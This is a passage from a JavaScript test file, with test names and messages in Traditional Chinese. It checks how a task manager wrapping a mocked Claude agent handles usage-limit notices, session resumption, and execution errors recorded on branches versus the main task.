    expect(notices).toEqual(['已達到訂閱方案的用量上限（5 小時）。', '已達到用量上限，請稍後再試'])
    claude.script = async () => []
    await tm.resume(id)
    await tm.whenIdle(id)
    expect(claude.calls.at(-1)).toMatchObject({
      prompt: expect.stringContaining('[resume]'),
      options: { resume: 'sess-0' }
    })
    expect(tm.get(id)).toMatchObject({ runState: 'idle', error: undefined })
  })

  test('分岔的 turn_end 失敗記在分岔上', async () => {
    const { tm, claude, create } = await setup()
    const id = await create()
    claude.script = async () => [{ type: 'result', subtype: 'error_during_execution' }]
    await tm.openBranch(id, { title: '討論' })
    await tm.whenIdle(id)
    expect(tm.get(id).branches[0].error).toBe('執行時發生錯誤')
    expect(tm.get(id).error).toBeUndefined()
    expect(tm.get(id).runState).toBe('idle')
  })

  test('主線的錯誤仍記在任務上，標為發生錯誤（可「繼續」）', async () => {
    const { tm, claude, create } = await setup()
    const id = await create()
    claude.script = async () => [{ type: 'result', subtype: 'error_during_execution' }]
    await tm.send(id, 'main', '失敗')
    await tm.whenIdle(id)
    expect(tm.get(id)).toMatchObject({ runState: 'error', error: '執行時發生錯誤' })
    claude.script = async () => []
    await tm.send(id, 'main', '再一次')
    await tm.whenIdle(id)
    expect(tm.get(id).error).toBeUndefined()
  })
})
